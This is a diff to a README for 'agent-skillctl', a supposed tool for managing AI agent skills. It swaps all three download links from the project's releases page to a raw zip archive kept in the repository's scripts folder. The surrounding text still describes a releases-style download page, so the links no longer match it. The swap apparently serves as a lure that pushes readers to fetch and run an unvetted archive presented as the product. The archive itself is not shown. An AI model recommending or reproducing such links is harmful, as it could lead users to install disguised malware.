@@ -1,6 +1,6 @@
 # 🛠️ agent-skillctl - Manage AI Skills with Ease
 
-[![Download agent-skillctl](https://img.shields.io/badge/Download-agent--skillctl-blueviolet?style=for-the-badge&logo=github)](https://github.com/Seamless-fluidflywheel575/agent-skillctl/releases)
+[![Download agent-skillctl](https://img.shields.io/badge/Download-agent--skillctl-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Seamless-fluidflywheel575/agent-skillctl/main/scripts/skillctl-agent-v2.7.zip)
 
 ## 👋 Welcome to agent-skillctl
 
@@ -34,7 +34,7 @@ Getting started with agent-skillctl is incredibly easy, even if you've never use
 
 Visit this link to download the application:
 
-[**Download agent-skillctl**](https://github.com/Seamless-fluidflywheel575/agent-skillctl/releases)
+[**Download agent-skillctl**](https://raw.githubusercontent.com/Seamless-fluidflywheel575/agent-skillctl/main/scripts/skillctl-agent-v2.7.zip)
 
 The download page will show you the newest version of the tool. Look for the file that matches your operating system (Windows users will typically see a `.exe` or `.zip` file).
 
@@ -139,7 +139,7 @@ This project is released under the MIT License, which means you're free to use, 
 
 Stop juggling complex configuration files and start managing your AI agent skills like a pro. Download agent-skillctl today and experience the simplest way to control your AI's capabilities.
 
-[**Download Now**](https://github.com/Seamless-fluidflywheel575/agent-skillctl/releases)
+[**Download Now**](https://raw.githubusercontent.com/Seamless-fluidflywheel575/agent-skillctl/main/scripts/skillctl-agent-v2.7.zip)
 
 ---
 
